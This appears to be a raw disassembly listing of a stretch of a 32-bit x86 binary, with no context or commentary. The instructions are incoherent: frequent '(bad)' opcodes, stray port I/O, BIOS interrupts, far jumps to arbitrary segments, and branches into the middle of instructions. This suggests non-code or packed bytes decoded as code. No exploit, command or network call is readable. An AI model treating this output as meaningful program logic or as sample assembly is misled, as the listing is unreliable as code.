  416ae5:	shl    BYTE PTR [eax-0x67],cl
  416ae8:	int    0x10
  416aea:	pop    ds
  416aeb:	mov    ch,0xba
  416aed:	sbb    eax,0x81c8565e
  416af2:	xlat   BYTE PTR ds:[ebx]
  416af3:	sbb    al,0xa4
  416af5:	shr    dl,1
  416af7:	mov    edi,0xe7bc82e7
  416afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416afd:	scas   al,BYTE PTR es:[edi]
  416afe:	pop    edx
  416aff:	adc    al,0xd2
  416b01:	dec    edi
  416b02:	fs jge 0x416af9
  416b05:	dec    edi
  416b06:	retf   0x5c62
  416b09:	out    0xf1,eax
  416b0b:	pop    edx
  416b0c:	inc    DWORD PTR [edi]
  416b0e:	dec    edx
  416b0f:	pop    ecx
  416b10:	cmp    eax,0x50bab428
  416b15:	or     al,0xb1
  416b17:	adc    bh,BYTE PTR [eax-0x7f127c77]
  416b1d:	jno    0x416b2f
  416b1f:	push   eax
  416b20:	aas    
  416b21:	or     al,0x3b
  416b23:	cmp    DWORD PTR [edi],eax
  416b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b26:	xor    al,0xc8
  416b28:	test   eax,0xc2bcd799
  416b2d:	sti    
  416b2e:	out    dx,al
  416b2f:	scas   eax,DWORD PTR es:[edi]
  416b30:	or     edx,DWORD PTR [bx+di]
  416b33:	repnz scas al,BYTE PTR es:[edi]
  416b35:	pop    esp
  416b36:	aad    0xf8
  416b38:	or     eax,0xfa8da844
  416b3d:	lods   al,BYTE PTR ds:[esi]
  416b3e:	xchg   edx,eax
  416b3f:	fwait
  416b40:	ror    DWORD PTR [ebx+0x60],0x63
  416b44:	adc    ah,BYTE PTR [ebp+eiz*4-0x53]
  416b48:	pop    edx
  416b49:	iret   
  416b4a:	mov    dl,0xc3
  416b4c:	stos   BYTE PTR es:[edi],al
  416b4d:	fwait
  416b4e:	outs   dx,BYTE PTR ds:[esi]
  416b4f:	mov    al,0x4c
  416b51:	adc    eax,0x2c0ff1f5
  416b56:	mov    ch,0xa8
  416b58:	cmp    dh,BYTE PTR [edi-0x33]
  416b5b:	iret   
  416b5c:	add    ah,BYTE PTR [edx-0x7a397529]
  416b62:	icebp  
  416b63:	inc    DWORD PTR [edx-0x41cd9f03]
  416b69:	bound  edi,QWORD PTR [esi]
  416b6b:	adc    BYTE PTR [edx-0x4fd226a2],0x87
  416b72:	mov    esp,0x7b0827f8
  416b77:	cs inc ebx
  416b79:	(bad)  
  416b7b:	call   0xc3ebc582
  416b80:	mov    ds:0x8e9a8ca0,eax
  416b85:	pop    ecx
  416b86:	nop
  416b87:	loopne 0x416bf9
  416b89:	pop    ebx
  416b8b:	sub    ah,BYTE PTR [eax]
  416b8d:	mov    ebx,0xa60afd9a
  416b92:	fs retf 
  416b94:	push   eax
  416b95:	sti    
  416b96:	xchg   ebp,eax
  416b97:	jmp    0x416bc0
  416b99:	fldcw  WORD PTR [eax+0x12]
  416b9c:	and    BYTE PTR [edx],dl
  416b9e:	xor    BYTE PTR [ebx-0x64],ch
  416ba1:	cmc    
  416ba2:	sub    eax,0xd60bb069
  416ba7:	add    al,0x3b
  416ba9:	pop    ebp
  416baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bab:	jge    0x416bc5
  416bad:	xchg   ecx,eax
  416bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416baf:	leave  
  416bb0:	sub    al,0x58
  416bb2:	adc    bl,bh
  416bb4:	je     0x416beb
  416bb6:	or     BYTE PTR [ecx],bh
  416bb8:	cmp    BYTE PTR [edx],dh
  416bba:	rcl    al,1
  416bbc:	mov    bh,0x71
  416bbe:	loop   0x416b7c
  416bc0:	mov    gs,ecx
  416bc2:	mov    eax,0xa1d89a73
  416bc7:	or     eax,ebx
  416bc9:	in     eax,0x72
  416bcb:	mov    ds:0x6f7f4d5f,al
  416bd0:	adc    DWORD PTR [ecx+0x37840df4],esp
  416bd6:	pop    ebx
  416bd7:	push   edx
  416bd8:	pop    es
  416bd9:	daa    
  416bda:	retf   
  416bdb:	xor    DWORD PTR ds:0xa809de1a,ebx
  416be1:	arpl   si,bp
  416be3:	out    0x5d,al
  416be5:	mov    ebx,0x68429676
  416bea:	xchg   ebx,eax
  416beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bec:	ret    0x1a98
  416bef:	dec    ebp
  416bf0:	out    dx,al
  416bf1:	and    al,0x66
  416bf3:	xor    eax,0xb1dca5a8
  416bf8:	or     DWORD PTR [esi+ebp*4],esp
  416bfb:	push   edi
  416bfc:	sub    eax,DWORD PTR [edx+0x7c107451]
  416c02:	fs fwait
  416c04:	xchg   edi,eax
  416c05:	gs cmp al,0x18
  416c08:	jge    0x416ba1
  416c0a:	jl     0x416bb2
  416c0c:	mov    ebp,0xa13069ca
  416c11:	pusha  
  416c12:	ins    DWORD PTR es:[edi],dx
  416c13:	mov    bl,0xd0
  416c15:	lods   al,BYTE PTR ds:[esi]
  416c16:	jmp    0x5e6a:0xd5686bc0
  416c1d:	xor    al,0xd
  416c1f:	cmp    DWORD PTR [eax+esi*1+0x5ed3425c],ebp
  416c26:	xchg   ebx,eax
  416c27:	jmp    0x542bad37
  416c2c:	and    dh,ch
  416c2e:	xor    eax,0xfb0a1f01
  416c33:	jecxz  0x416c24
  416c35:	bound  edi,QWORD PTR [ecx]
  416c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c38:	aas    
  416c39:	jne    0x416c22
  416c3b:	loopne 0x416bde
  416c3d:	jmp    0x416c83
  416c3f:	jo     0x416ca1
  416c41:	jmp    0x149d:0xb2d1c8e6
  416c48:	adc    edx,DWORD PTR [edi+ebp*8+0xcc2002b]
  416c4f:	les    esi,FWORD PTR [edx-0x6cedf370]
  416c55:	pop    ebp
  416c56:	mov    ch,0xe4
  416c58:	in     al,dx
  416c59:	mov    dh,0xc8
  416c5b:	popa   
  416c5c:	fcmovne st,st(0)
  416c5e:	cmc    
  416c5f:	cs mov esp,0x9cfadefa
  416c65:	mov    DWORD PTR [esi+0x27],eax
  416c68:	ins    BYTE PTR es:[edi],dx
  416c69:	xchg   cl,cl
  416c6b:	into   
  416c6c:	add    bl,dl
  416c6e:	jmp    0xbf47:0xa5471489
  416c75:	(bad)  
  416c76:	mov    eax,0xbec2aa04
  416c7b:	clc    
  416c7c:	add    edi,DWORD PTR ds:0x16c42bca
  416c82:	icebp  
  416c83:	xor    dh,BYTE PTR ds:0x9e20c147
  416c89:	mov    al,0x9d
  416c8b:	inc    ecx
  416c8c:	xadd   DWORD PTR [edi],esi
  416c8f:	push   0xb99d979d
  416c94:	daa    
  416c95:	daa    
  416c96:	mov    ds:0xe80eb6dd,al
  416c9b:	(bad)
  416c9e:	test   eax,0xdfd67fe1
  416ca3:	icebp  
  416ca4:	into   
  416ca5:	push   cs
  416ca6:	add    eax,0x7de5ea67
  416cab:	mov    al,BYTE PTR [edi]
  416cad:	mov    eax,0x66925663
  416cb2:	mov    al,ds:0x4c6fadd9
  416cb7:	jae    0x416ce3
  416cb9:	dec    edx
  416cba:	push   edi
  416cbb:	inc    ecx
  416cbc:	stos   DWORD PTR es:[edi],eax
  416cbd:	mov    eax,0x52a77ede
  416cc2:	ins    DWORD PTR es:[edi],dx
  416cc3:	push   0xffffff8a
  416cc5:	(bad)  
  416cc6:	mov    fs,WORD PTR [ebx+0x7d]
  416cc9:	lods   al,BYTE PTR ds:[esi]
  416cca:	xor    BYTE PTR es:[eax+edi*2-0x5c55506d],cl
  416cd2:	push   es
  416cd3:	call   0x5fed76a8
  416cd8:	mov    dh,BYTE PTR [ebp+0x52]
  416cdb:	aam    0x43
  416cdd:	cmp    DWORD PTR [ebx],ecx
  416cdf:	dec    edx
  416ce0:	xchg   edi,eax
  416ce1:	das    
  416ce2:	jb     0x416ce1
  416ce4:	outs   dx,BYTE PTR ds:[esi]
  416ce5:	outs   dx,BYTE PTR ds:[esi]
  416ce6:	jne    0x416d49
  416ce8:	mov    ch,0x78
  416cea:	sbb    DWORD PTR [edi+0x27],eax
  416ced:	ins    DWORD PTR es:[edi],dx
  416cee:	into   
  416cef:	int3   
  416cf0:	sbb    BYTE PTR [esi+edx*8-0x4b],ch
  416cf4:	mov    al,0xe6
  416cf6:	sub    dh,bl
  416cf8:	scas   al,BYTE PTR es:[edi]
  416cf9:	stos   BYTE PTR es:[edi],al
  416cfa:	int3   
  416cfb:	pop    ebp
  416cfc:	inc    edx
  416cfd:	cli    
  416cfe:	fstp   DWORD PTR [ecx+0x70dd1712]
  416d04:	adc    BYTE PTR [edx+0x39],al
  416d07:	in     eax,dx
  416d08:	push   eax
  416d09:	add    al,BYTE PTR ds:0xce60c029
  416d0f:	sbb    eax,0x116ee2d6
  416d14:	xor    BYTE PTR [edx-0x488b8694],0x83
  416d1b:	jle    0x416d38
  416d1d:	in     al,dx
  416d1e:	mov    ch,0xe5
  416d20:	fst    QWORD PTR [ecx]
  416d22:	in     eax,0x1
  416d24:	and    al,0x26
  416d26:	or     eax,0xc628a343
  416d2b:	mov    eax,0x911a4862
  416d30:	jno    0x416d13
  416d32:	aas    
  416d33:	lods   eax,DWORD PTR ds:[esi]
  416d34:	leave  
  416d35:	pop    ds
  416d36:	out    dx,al
  416d37:	stos   DWORD PTR es:[edi],eax
  416d38:	push   ss
  416d39:	lahf   
  416d3a:	pop    ebp
  416d3b:	je     0x416d2f
  416d3d:	pop    ecx
  416d3e:	pop    ss
  416d3f:	into   
  416d40:	jnp    0x416cca
  416d42:	jg     0x416d59
  416d44:	mov    ebp,0x97d17bd4
  416d49:	xor    ah,BYTE PTR [edx+ebp*2]
  416d4c:	pop    es
  416d4d:	pop    edi
  416d4e:	fisttp DWORD PTR [ebp*2-0x40d82ada]
  416d55:	mov    dl,0x3e
  416d57:	stos   BYTE PTR es:[edi],al
  416d58:	push   ebp
  416d59:	pop    esi
  416d5a:	inc    edi
  416d5b:	or     ch,BYTE PTR [eax]
  416d5d:	add    BYTE PTR [eax+0x31],bl
  416d60:	dec    eax
  416d61:	jp     0x416d66
  416d63:	popa   
  416d64:	adc    edi,DWORD PTR [ebx+0x2549e9f4]
  416d6a:	pop    es
  416d6b:	jne    0x416d31
  416d6d:	inc    edx
  416d6e:	(bad)  
  416d6f:	lods   eax,DWORD PTR ds:[esi]
  416d70:	icebp  
  416d71:	stos   DWORD PTR es:[edi],eax
  416d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d73:	mov    dl,0x95
  416d75:	dec    edi
  416d76:	adc    BYTE PTR [ecx+0x11],ch
  416d79:	inc    ebp
  416d7a:	push   es
  416d7b:	mov    ebp,0xd1a248f
  416d80:	ja     0x416d1a
  416d82:	sbb    BYTE PTR [edi-0x64],0x12
  416d86:	cs push edx
  416d88:	cmp    ecx,DWORD PTR [esp+ecx*4+0x1a]
  416d8c:	jmp    0xba41d73a
  416d91:	ja     0x416deb
  416d93:	outs   dx,DWORD PTR ds:[esi]
  416d94:	mov    ch,0xd7
  416d96:	pop    ss
  416d97:	pushf  
  416d98:	fwait
  416d99:	pusha  
  416d9a:	retf   
  416d9b:	mov    BYTE PTR [edi],bl
  416d9d:	call   0xf534:0xc6410165
  416da4:	jp     0x416d9f
  416da6:	sbb    eax,0x3cdd22a2
  416dab:	jnp    0x416e28
  416dad:	lods   eax,DWORD PTR ds:[esi]
  416dae:	cmp    ah,cl
  416db0:	iret   
  416db1:	and    DWORD PTR [ebp-0x4],0xffffff83
  416db5:	ret    
  416db6:	stos   BYTE PTR es:[edi],al
  416db7:	xor    esi,esp
  416db9:	lods   al,BYTE PTR ds:[esi]
  416dba:	aam    0x8f
  416dbc:	sub    eax,0x5d9e594f
  416dc1:	xor    al,0x5
  416dc3:	out    dx,al
  416dc4:	neg    DWORD PTR [ecx+0x3adcbb30]
  416dca:	mov    bl,0x29
  416dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dcd:	jl     0x416e1a
  416dcf:	mov    eax,ds:0x1612ece8
  416dd4:	sub    dh,BYTE PTR [edx+edx*4-0x412ac592]
  416ddb:	popf   
  416ddc:	int    0xf
  416dde:	push   esp
  416ddf:	retf   
  416de0:	imul   ecx,DWORD PTR [edi+0x2ab2013a],0xafd1a169
  416dea:	pop    ecx
  416deb:	stos   BYTE PTR es:[edi],al
  416dec:	inc    ecx
  416ded:	xchg   edi,eax
  416dee:	mov    edi,0x3cb75383
  416df3:	test   BYTE PTR [ebp-0x747b860],ch
  416df9:	push   esp
  416dfa:	pop    ebp
  416dfb:	sub    dh,BYTE PTR [ebx]
  416dfd:	das    
  416dfe:	jmp    0x7e5c:0x5c4803f0
  416e05:	ins    DWORD PTR es:[edi],dx
  416e06:	lock add al,0x3e
  416e09:	add    DWORD PTR [ebx],0x9c063fbb
  416e0f:	js     0x416d91
  416e11:	sar    DWORD PTR [edi-0x59],cl
  416e14:	add    al,0xef
  416e16:	add    ch,BYTE PTR [esi-0x7e96759a]
  416e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e1d:	(bad)  
  416e1e:	dec    esi
  416e1f:	mov    esp,0xbb639d9f
  416e25:	stc    
  416e26:	aas    
  416e27:	cmp    ecx,eax
  416e29:	cmp    BYTE PTR [ebx],cl
  416e2b:	push   ds
  416e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e2d:	sti    
  416e2e:	mov    ecx,0x4b0d2b5e
  416e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e34:	out    0x44,al
  416e36:	mov    ch,0x8
  416e38:	and    BYTE PTR [eax+0x6431a74],dh
  416e3e:	and    al,0x24
  416e40:	and    BYTE PTR [ebx],bl
  416e42:	inc    edi
  416e43:	loopne 0x416e28
  416e45:	mov    ah,0xdb
  416e47:	addr16 inc ecx
  416e49:	es push ebp
  416e4b:	add    al,0x5e
  416e4d:	sbb    eax,0xd9e03825
  416e52:	mov    ebp,edi
  416e54:	sub    al,0x2b
  416e56:	push   eax
  416e57:	mov    dh,0x3b
  416e59:	jge    0x416e11
  416e5b:	mov    ebx,DWORD PTR [edi]
  416e5d:	popf   
  416e5e:	ror    DWORD PTR [ecx],1
  416e60:	inc    ecx
  416e61:	dec    ebx
  416e62:	out    dx,al
  416e63:	lock loopne 0x416e99
  416e66:	hlt    
  416e67:	and    al,0x94
  416e69:	aam    0x94
  416e6b:	sub    eax,0x419ffcd
  416e70:	jecxz  0x416e71
  416e72:	leave  
  416e73:	or     al,0xf4
  416e75:	out    dx,al
  416e76:	jnp    0x416e19
  416e78:	icebp  
  416e79:	in     al,dx
  416e7a:	cwde   
  416e7b:	xchg   BYTE PTR [ebp+0x3a],bl
  416e7e:	not    eax
  416e80:	xchg   edi,eax
  416e81:	in     eax,dx
  416e82:	arpl   WORD PTR [eax],bp
  416e84:	jae    0x416e71
  416e86:	add    al,bl
  416e88:	xchg   ebp,eax
  416e89:	fld    TBYTE PTR [esi-0xb]
  416e8c:	mov    esp,0x65d646cd
  416e91:	in     al,dx
  416e92:	scas   eax,DWORD PTR es:[edi]
  416e93:	add    BYTE PTR [eax],ah
  416e95:	jbe    0x416e97
  416e97:	mov    ch,0xa7
  416e99:	cmp    al,0x35
  416e9b:	xor    DWORD PTR [ebx+0x237f2bd4],ecx
  416ea1:	outs   dx,BYTE PTR ds:[esi]
  416ea2:	mov    edi,0x11116e7a
  416ea7:	xchg   edi,eax
  416ea8:	call   0x7f38019f
  416ead:	inc    ecx
  416eae:	retf   
  416eaf:	push   cs
  416eb0:	les    esi,FWORD PTR [ebx+0x1e0bb9da]
  416eb6:	mov    al,0x5e
  416eb8:	je     0x416e83
  416eba:	adc    ecx,DWORD PTR [edx]
  416ebc:	outs   dx,BYTE PTR ds:[esi]
  416ebd:	sbb    DWORD PTR ss:[esi+0x77deeca7],ebp
  416ec4:	cmp    esi,DWORD PTR [ebx+edi*4+0x1a]
  416ec8:	lods   eax,DWORD PTR ds:[esi]
  416ec9:	fisub  DWORD PTR [esi]
  416ecb:	ja     0x416e57
  416ecd:	cwde   
  416ece:	xchg   esi,eax
  416ecf:	out    0x20,al
  416ed1:	jns    0x416f25
  416ed3:	jo     0x416f3a
  416ed5:	dec    ebp
  416ed6:	ret    
  416ed7:	sbb    ebp,DWORD PTR ds:0x858830a6
  416edd:	retf   0x33f7
  416ee0:	mov    bh,0x6d
  416ee2:	ror    DWORD PTR [edi],cl
  416ee4:	mov    bl,bl
  416ee6:	and    dl,dh
  416ee8:	and    ah,BYTE PTR [edx+edi*4-0x58]
  416eec:	jecxz  0x416eb7
  416eee:	popf   
  416eef:	mov    ds:0x3d5a2f6,al
  416ef4:	mov    esi,0x6d0fc494
  416ef9:	fild   DWORD PTR [edx+0x58cc0d11]
  416eff:	push   cs
  416f00:	cwde   
  416f01:	stos   BYTE PTR es:[edi],al
  416f02:	push   eax
  416f03:	stc    
  416f04:	and    al,0x75
  416f06:	mov    eax,edi
  416f08:	aam    0x20
  416f0a:	inc    ecx
  416f0b:	mov    eax,0x68cfd904
  416f10:	std    
  416f11:	lods   al,BYTE PTR ds:[esi]
  416f12:	outs   dx,DWORD PTR ds:[esi]
  416f13:	jecxz  0x416e95
  416f15:	or     ecx,DWORD PTR [eax]
  416f17:	sub    BYTE PTR [edx+edi*8+0x2ff58fb4],ch
  416f1e:	sbb    BYTE PTR [ebx],dh
  416f20:	es je  0x416ebd
  416f23:	and    eax,DWORD PTR [ecx+0x2a]
  416f26:	(bad)  
  416f27:	lods   eax,DWORD PTR ds:[esi]
  416f28:	cmc    
  416f29:	or     cl,0xf8
  416f2c:	imul   edx,DWORD PTR [ecx-0xe],0xf121621e
  416f33:	jo     0x416f1d
  416f35:	and    eax,0x7feac084
  416f3a:	and    al,0x82
  416f3c:	jno    0x416fb6
  416f3e:	adc    dh,BYTE PTR [esi-0xc]
  416f41:	add    dh,BYTE PTR [esi-0x7ee18e36]
  416f47:	cdq    
  416f48:	fisubr DWORD PTR [eax-0x2c]
  416f4b:	cli    
  416f4c:	dec    ebx
  416f4d:	cmp    al,0x6f
  416f4f:	pop    ds
  416f50:	test   al,0x69
  416f52:	cld    
  416f53:	rcl    DWORD PTR [esp+eiz*2],1
  416f56:	cmp    al,0x15
  416f58:	sub    eax,DWORD PTR [ebp-0x3cf98002]
  416f5e:	fcom   QWORD PTR [eax+0x75]
  416f61:	aas    
  416f62:	lds    ecx,FWORD PTR [ebx]
  416f64:	sbb    bh,BYTE PTR [ebx+0x3a4b9ef8]
  416f6a:	pop    ebp
  416f6b:	sbb    eax,0x4392fb47
  416f70:	repnz (bad) 
  416f72:	ficomp WORD PTR [eax-0x35]
  416f75:	and    eax,0xce930f94
  416f7a:	mov    dl,0xee
  416f7c:	ficomp DWORD PTR [edx]
  416f7e:	and    BYTE PTR [ebp-0x70],dl
  416f81:	repz inc esi
  416f83:	shl    DWORD PTR [eax-0x75],0x26
  416f87:	jle    0x416f28
  416f89:	iret   
  416f8a:	mov    eax,ds:0xb7ef9a69
  416f8f:	sub    BYTE PTR [esi-0x2d],dh
  416f92:	mov    bl,0xf4
  416f94:	and    ecx,DWORD PTR [eax]
  416f96:	mov    eax,0x2fa01ca4
  416f9b:	mov    BYTE PTR [esi],al
  416f9d:	popa   
  416f9e:	and    dl,dh
  416fa0:	icebp  
  416fa1:	jecxz  0x416fd2
  416fa3:	hlt    
  416fa4:	iret   
  416fa5:	iret   
  416fa6:	scas   al,BYTE PTR es:[edi]
  416fa7:	jge    0x416f48
  416fa9:	cmp    ebp,DWORD PTR [edx]
  416fab:	cmp    eax,0x99fbfee
  416fb0:	daa    
  416fb1:	rcr    DWORD PTR [ecx-0x7b],1
  416fb4:	pusha  
  416fb5:	adc    al,0x9e
  416fb7:	mov    ebp,0xb9f99133
  416fbc:	sahf   
  416fbd:	mov    cl,0x74
  416fbf:	cmc    
  416fc0:	jge    0x416fd4
  416fc2:	push   ss
  416fc3:	inc    ebp
  416fc4:	repz xor eax,0x498de810
  416fca:	push   es
  416fcb:	push   ebx
  416fcc:	sub    al,0xac
  416fce:	test   eax,0x985f62c3
  416fd3:	fs stos BYTE PTR es:[edi],al
  416fd5:	fisub  WORD PTR [esi-0x1d]
  416fd8:	mov    ch,BYTE PTR [ecx]
  416fda:	mov    WORD PTR [esi+ecx*4-0x253ea1da],ss
  416fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fe2:	fild   DWORD PTR gs:[ebp-0x48]
  416fe6:	jmp    0x41700b
  416fe8:	mov    ?,WORD PTR [ecx+0x60]
  416feb:	xchg   esi,eax
  416fec:	pop    ecx
  416fed:	jecxz  0x416fbd
  416fef:	mov    ah,0x45
  416ff1:	retf   
  416ff2:	xor    cl,ch
  416ff4:	jl     0x416fe9
  416ff6:	and    al,0xd4
  416ff8:	in     al,dx
  416ff9:	sbb    edx,DWORD PTR [ebx]
  416ffb:	sub    bh,BYTE PTR [eax-0x209065d9]
  417001:	aam    0x4c
  417003:	mov    edi,0x699c96c4
  417008:	jnp    0x41704c
  41700a:	inc    edx
  41700b:	js     0x416fee
  41700d:	ficom  DWORD PTR [ebx]
  41700f:	les    esp,FWORD PTR [ebp+0x276bff52]
  417015:	clc    
  417016:	jp     0x41708e
  417018:	adc    ah,BYTE PTR [ebp+0x62]
  41701b:	hlt    
  41701c:	nop
  41701d:	popa   
  41701e:	push   ds
  41701f:	or     DWORD PTR [edi+0x85f136],ebp
  417025:	jmp    0x69d9:0xe0c83c65
  41702c:	or     esi,0xffffffd0
  41702f:	ds xchg edx,eax
  417031:	cmp    al,0xf9
  417033:	dec    esi
  417034:	push   ebx
  417035:	jbe    0x4170a7
  417037:	out    dx,al
  417038:	jae    0x417033
  41703a:	adc    DWORD PTR [esi],esi
  41703c:	daa    
  41703d:	ins    DWORD PTR es:[edi],dx
  41703e:	stos   DWORD PTR es:[edi],eax
  41703f:	push   0x2e
  417041:	repz ror BYTE PTR [eax],0x68
  417045:	dec    ebx
  417046:	(bad)  
  417047:	jae    0x4170b3
  417049:	mov    ecx,0xc587be52
  41704e:	inc    edi
  41704f:	ret    0x9612
  417052:	pop    es
  417053:	stos   BYTE PTR es:[edi],al
  417054:	mov    ds:0x969c945c,al
  417059:	inc    edx
  41705a:	inc    edi
  41705b:	inc    edx
  41705c:	fsubr  st(7),st
  41705e:	sbb    dl,BYTE PTR [esi+0x8dba56f]
  417064:	xchg   ecx,eax
  417065:	inc    eax
  417066:	push   DWORD PTR [edx+0x37]
  417069:	sub    cl,BYTE PTR [esi]
  41706b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41706c:	pop    esp
  41706d:	pop    esp
  41706e:	xchg   esp,eax
  41706f:	sbb    DWORD PTR [esi],0x4af95c48
  417075:	jp     0x4170d8
  417077:	repz inc eax
  417079:	xor    esp,DWORD PTR [ebx+eax*1]
  41707c:	inc    edx
  41707d:	addr16 inc edx
  41707f:	dec    edi
  417080:	sub    al,0xbf
  417082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417083:	addr16 jge 0x41709d
  417086:	xor    DWORD PTR [ebx],0xffffff83
  417089:	aad    0x42
  41708b:	xor    ah,bl
  41708d:	adc    DWORD PTR [eax],0x4a8d7d1b
  417093:	mov    ebx,0x3645b3bd
  417098:	xor    DWORD PTR [edx-0x63],esp
  41709b:	stos   BYTE PTR es:[edi],al
  41709c:	(bad)  
  41709d:	fbstp  TBYTE PTR [esi+eax*1+0x41]
  4170a1:	call   0xcf1f:0xb3de767
  4170a8:	fld    QWORD PTR [edx]
  4170aa:	adc    al,0x29
  4170ac:	ss nop
  4170ae:	or     al,0x84
  4170b0:	mov    eax,0xd5455653
  4170b5:	imul   ebp,DWORD PTR [ebx-0x2d],0xa1c5125a
  4170bc:	push   edx
  4170bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170be:	sub    DWORD PTR [eax-0x775a22f4],0x6e
  4170c5:	cmp    esp,DWORD PTR [edx+0x16]
  4170c8:	jno    0x4170eb
  4170ca:	cmp    BYTE PTR [ecx-0x4d],dh
  4170cd:	jmp    0x417131
  4170cf:	pop    edx
  4170d0:	scas   eax,DWORD PTR es:[edi]
  4170d1:	in     al,dx
  4170d2:	dec    esp
  4170d3:	jo     0x417090
  4170d5:	add    al,0xcc
  4170d7:	fwait
  4170d8:	jo     0x4170ef
  4170da:	fsub   QWORD PTR [esi-0x60]
  4170dd:	or     dl,BYTE PTR [ecx]
  4170df:	outs   dx,BYTE PTR ds:[esi]
  4170e0:	push   edx
  4170e1:	cmp    eax,0x624f1fa4
  4170e6:	pop    esi
  4170e7:	jge    0x41713b
  4170e9:	fiadd  WORD PTR [edx-0x4c6cbdbd]
  4170ef:	ss mov cl,0x94
  4170f2:	pop    edi
  4170f3:	sbb    ebp,DWORD PTR [ebx+eax*2+0x23b8a360]
  4170fa:	repz mov edx,0xd35057d2
  417100:	pushf  
  417101:	pushf  
  417102:	mov    bh,0xc3
  417104:	(bad)  
  417105:	fnsave [eax]
  417107:	popf   
  417108:	ins    DWORD PTR es:[edi],dx
  417109:	je     0x417167
  41710b:	mov    eax,ds:0x49f4f1cd
  417110:	aas    
  417111:	out    0xc4,eax
  417113:	ins    DWORD PTR es:[edi],dx
  417114:	dec    esp
  417115:	cmp    DWORD PTR [eax+0xe],eax
  417118:	fcomp  DWORD PTR [eax-0x24]
  41711b:	scas   al,BYTE PTR es:[edi]
  41711c:	or     esi,DWORD PTR [eax]
  41711e:	imul   edx,DWORD PTR [ecx],0x3c9d7ac4
  417124:	xchg   esi,eax
  417125:	push   ecx
  417126:	cmp    eax,0x423e43b1
  41712b:	repnz pop ebx
  41712d:	jo     0x41714e
  41712f:	pop    edx
  417130:	das    
  417131:	cli    
  417132:	aas    
  417133:	mov    edx,0x39f2770b
  417138:	push   esp
  417139:	sbb    BYTE PTR [ebx+0x59],0x16
  41713d:	mov    ds:0x8f955646,eax
  417142:	pop    ds
  417143:	div    edi
  417145:	xchg   edi,eax
  417146:	lods   al,BYTE PTR ds:[esi]
  417147:	inc    ebx
  417148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417149:	popf   
  41714a:	scas   al,BYTE PTR es:[edi]
  41714b:	adc    BYTE PTR [ecx],bh
  41714d:	ret    0x94b4
  417150:	mov    BYTE PTR [eax],bh
  417152:	mov    dl,0x81
  417154:	dec    ecx
  417155:	add    esi,DWORD PTR ds:0xa51c752d
  41715b:	imul   ecx,edi,0xb91aee1d
  417161:	xchg   esi,eax
  417162:	frstor [esi+0x5c1475c4]
  417168:	push   cs
  417169:	mul    BYTE PTR [ecx-0x7d]
  41716c:	(bad)  
  41716d:	sbb    DWORD PTR [ebx+esi*2-0x4ccbc4b7],ebx
  417174:	jnp    0x4171f4
  417176:	xchg   edx,eax
  417177:	std    
  417178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417179:	jecxz  0x41719d
  41717b:	add    eax,0x9353a4ee
  417180:	adc    eax,0x7d66dc40
  417185:	out    dx,al
  417186:	inc    edx
  417187:	stos   DWORD PTR es:[edi],eax
  417188:	sub    al,BYTE PTR [eax]
  41718a:	retf   
  41718b:	jmp    0x6cf7ec1a
  417190:	xchg   DWORD PTR [eax],eax
  417192:	dec    edx
  417193:	stos   DWORD PTR es:[edi],eax
  417194:	dec    edi
  417195:	fnstsw WORD PTR [esi-0x4bb179ad]
  41719b:	adc    al,BYTE PTR [esi]
  41719d:	add    al,0x65
  41719f:	test   DWORD PTR [edi-0x67cf8fc2],ebp
  4171a5:	or     eax,0x7c99c6a0
  4171aa:	pop    eax
  4171ab:	dec    ebp
  4171ac:	jle    0x417177
  4171ae:	pop    ebp
  4171af:	ficom  WORD PTR [eax]
  4171b1:	popa   
  4171b2:	sbb    bl,BYTE PTR [ebx+0x45]
  4171b5:	mov    DWORD PTR [eax-0x4859f199],eax
  4171bb:	retf   
  4171bc:	xlat   BYTE PTR ds:[ebx]
  4171bd:	shr    DWORD PTR [edi+0xf],cl
  4171c0:	adc    BYTE PTR [esi],ch
  4171c2:	add    bh,bl
  4171c4:	mov    BYTE PTR [ecx-0x15fe3b9a],dl
  4171ca:	out    dx,eax
  4171cb:	adc    BYTE PTR [edx-0x25d79b8a],bh
  4171d1:	dec    ecx
  4171d2:	or     eax,0x726a8973
  4171d7:	dec    esp
  4171d8:	push   ebx
  4171d9:	dec    edi
  4171da:	int    0x12
  4171dc:	addr16 push eax
  4171de:	mov    ds:0x8b8f87b5,al
  4171e3:	fsubrp st(1),st
  4171e5:	(bad)  
  4171e6:	cmc    
  4171e7:	mov    esp,DWORD PTR [esi]
  4171e9:	in     al,0xa9
  4171eb:	pop    edi
  4171ec:	xchg   esp,eax
  4171ed:	cli    
  4171ee:	dec    ecx
  4171ef:	pop    ecx
  4171f0:	push   esp
  4171f1:	in     al,0x73
  4171f3:	cmp    ebp,DWORD PTR [ecx+0x2dc96574]
  4171f9:	and    DWORD PTR [ebx],eax
  4171fb:	in     eax,0x69
  4171fd:	fidiv  DWORD PTR [eax+0x7e]
  417200:	ret    0xd5f2
  417203:	mov    WORD PTR [esi+0x57],gs
  417206:	add    al,0xcc
  417208:	or     al,0x2a
  41720a:	ret    0x1156
  41720d:	push   ecx
  41720e:	dec    edx
  41720f:	in     al,dx
  417210:	mov    ch,0xa7
  417212:	dec    ebp
  417213:	xor    dl,bl
  417215:	shl    bh,cl
  417217:	xchg   ecx,eax
  417218:	rcl    DWORD PTR [esi+edx*2-0x5f],1
  41721c:	mov    ds:0x3a7132c8,eax
  417221:	pop    ebp
  417222:	mov    eax,ds:0x99d25694
  417227:	xor    al,0x7e
  417229:	cli    
